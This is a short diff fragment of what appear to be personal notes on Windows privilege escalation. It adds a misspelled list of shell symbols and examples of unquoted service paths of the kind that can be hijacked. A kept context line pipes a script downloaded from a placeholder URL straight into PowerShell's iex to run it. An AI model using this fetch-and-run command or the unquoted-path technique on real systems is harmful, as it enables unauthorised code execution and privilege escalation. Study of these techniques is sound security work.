@@ -46,3 +46,25 @@ For extremely accuracy please run every scripts one by one
   irm https://githubrawfilelink.com/blablabla/exploit.ps1 | iex 
 ```
 
+<> operator
+- dash
+/ shash
+\ revers-shlash
+= equal
+$ val / def
+' quot
+" double quot
+
+Absolute Path in quotes:
+ "C:\Program Files\Vuln Service\DLL.exe"
+
+Relative Path
+Windows
+cmd.exe
+
+Vuln Service Looks Like:
+
+ C:\Program Files\Vuln Service x64\DLL.exe /sc /q /r 
+ C:\Program Files\Vuln.exe Service x64\DLL.exe /sc /q /r 
+ C:\Program Files\Vuln Service.exe x64\DLL.exe /sc /q /r 
+ C:\Program Files\Vuln Service x64\DLL.exe /sc /q /r 
